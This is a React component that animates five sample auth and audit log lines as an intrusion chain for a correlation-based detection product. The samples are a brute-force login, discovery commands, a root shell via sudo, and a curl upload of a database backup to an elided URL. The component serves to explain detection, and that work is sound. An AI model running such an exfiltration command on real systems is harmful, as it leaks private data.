import { useEffect, useRef, useState } from "react";
import { Play, Pause, RotateCcw, SkipForward } from "lucide-react";
import "./attackChain.css";

/*
 * TACTIC's premise, played out.
 *
 * Each of these five log lines is unremarkable on its own, and a
 * signature-based system either suppresses it or buries it. The last step
 * correlates them on subject and time, and the same five lines describe a
 * complete intrusion.
 *
 * The events are representative Linux auth, privilege and process records.
 * Severities are the point: five lows that become one critical.
 */

const EVENTS = [
	{
		t: "02:14:07",
		src: "auth.log",
		line: "Failed password for invalid user admin from 203.0.113.44",
		alone: "low",
		tactic: "Initial Access",
		technique: "T1110 · Brute Force",
	},
	{
		t: "02:14:52",
		src: "auth.log",
		line: "Accepted password for svc_backup from 203.0.113.44",
		alone: "info",
		tactic: "Initial Access",
		technique: "T1078 · Valid Accounts",
	},
	{
		t: "02:16:31",
		src: "audit.log",
		line: "execve /usr/bin/whoami, /usr/bin/id, /usr/bin/uname -a",
		alone: "info",
		tactic: "Discovery",
		technique: "T1082 · System Information",
	},
	{
		t: "02:19:03",
		src: "auth.log",
		line: "svc_backup : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash",
		alone: "low",
		tactic: "Privilege Escalation",
		technique: "T1548 · Abuse Elevation",
	},
	{
		t: "02:24:40",
		src: "audit.log",
		line: "execve /usr/bin/curl -T /var/backups/db.sql.gz https://…",
		alone: "low",
		tactic: "Exfiltration",
		technique: "T1048 · Alt Protocol",
	},
];

// One step per event, then a final correlation step.
const LAST = EVENTS.length + 1;

export default function AttackChain() {
	const [step, setStep] = useState(0);
	const [playing, setPlaying] = useState(false);
	const timer = useRef(null);

	const correlated = step > EVENTS.length;
	const shown = Math.min(step, EVENTS.length);

	useEffect(() => {
		if (!playing) return;
		if (step >= LAST) {
			setPlaying(false);
			return;
		}
		timer.current = setTimeout(() => setStep((s) => s + 1), 1300);
		return () => clearTimeout(timer.current);
	}, [playing, step]);

	const go = (n) => {
		setPlaying(false);
		setStep(Math.min(Math.max(n, 0), LAST));
	};

	return (
		<div className={`ac ${correlated ? "is-correlated" : ""}`}>
			<div className="ac__head mono">
				<span>{correlated ? "Chain detected" : "Event stream"}</span>
				<span className="ac__source">
					{correlated
						? "5 events · 4 tactics · 1 subject"
						: "auth.log · audit.log"}
				</span>
			</div>

			<ol className="ac__events">
				{EVENTS.map((event, i) => {
					const visible = i < shown;
					return (
						<li
							className={`ac__event ${visible ? "is-in" : ""} ${
								correlated ? "is-linked" : ""
							}`}
							key={event.t}
							aria-hidden={!visible}
						>
							<span className="ac__rail" aria-hidden="true" />

							<span className="ac__time mono">{event.t}</span>

							<span className="ac__body">
								<span className="ac__line mono">
									{event.line}
								</span>
								<span className="ac__meta mono">
									<span className="ac__src">{event.src}</span>
									{correlated && (
										<>
											<span className="ac__tactic">
												{event.tactic}
											</span>
											<span className="ac__technique">
												{event.technique}
											</span>
										</>
									)}
								</span>
							</span>

							<span
								className={`ac__sev ac__sev--${
									correlated ? "critical" : event.alone
								} mono`}
							>
								{correlated ? "critical" : event.alone}
							</span>
						</li>
					);
				})}
			</ol>

			<p className="ac__note" aria-live="polite">
				{correlated
					? "Correlated on subject and time. Individually every line above was suppressed or ignored. In sequence they are a brute-force entry, reconnaissance, privilege escalation and exfiltration by one actor over ten minutes."
					: shown === 0
					? "Five log lines, arriving over ten minutes."
					: `${shown} of ${EVENTS.length} events. Each one is below the alerting threshold on its own.`}
			</p>

			<div className="ac__controls">
				<button
					type="button"
					className="ac__btn"
					onClick={() => go(0)}
					aria-label="Reset"
					disabled={step === 0}
				>
					<RotateCcw size={13} strokeWidth={1.7} />
				</button>
				<button
					type="button"
					className="ac__btn ac__btn--play"
					onClick={() => {
						if (step >= LAST) setStep(0);
						setPlaying((p) => !p);
					}}
					aria-label={playing ? "Pause" : "Play"}
				>
					{playing ? (
						<Pause size={13} strokeWidth={1.7} />
					) : (
						<Play size={13} strokeWidth={1.7} />
					)}
					{playing ? "Pause" : "Play"}
				</button>
				<button
					type="button"
					className="ac__btn"
					onClick={() => go(step + 1)}
					aria-label="Next"
					disabled={step >= LAST}
				>
					<SkipForward size={13} strokeWidth={1.7} />
				</button>
				<span className="ac__progress mono">
					{step} / {LAST}
				</span>
			</div>
		</div>
	);
}
